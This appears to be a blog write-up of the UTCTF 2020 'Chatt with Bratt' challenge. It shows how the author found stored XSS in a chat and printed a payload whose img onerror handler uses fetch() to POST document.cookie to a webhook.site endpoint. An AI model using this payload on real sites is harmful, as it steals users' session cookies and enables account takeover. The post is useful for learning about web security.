---
title: "UTCTF 2020 - Chatt with Bratt Writeup"
date: 2020-03-10T08:30:29Z
---

<!-- 
UTCTF was my (and my team) first CTF. I learned a lot!

Before getting into the problem, I want to thank everyone in the UTCTF Discord, they really made my first experience much better! 
-->

For this challenge we were faced with a chat room with Brad Pid himself!
There was a warning though, we could not be rude to Brad because we admins would check the chats.

With this in mind, we start by trying a simple [XSS injection](https://owasp.org/www-community/attacks/xss/).

```html
<body onload=alert('test1')>
```

Hitting send caused the alert to trigger! 
So now lets make it a bit more complex, we need some endpoint to make requests to.
I used [Webhook.site](https://webhook.site), it gives me an url to make requests to and logs everything.

Before getting into the script, we need to decide what to steal.
In our case, when looking at the cookies there is one that stands out, the `secret`.

We'll steal them!

My final script looked like:

```html
<img 
    src="http://url.to.file.which/not.exist" 
    onerror="fetch(
        'https://webhook.site/#!/81f7d094-c908-465d-a571-ad47582fd6c6', {
            method:'POST', 
            body: JSON.stringify({data:document.cookie})
        }
    );">
```

Which sent the flag to the given endpoint.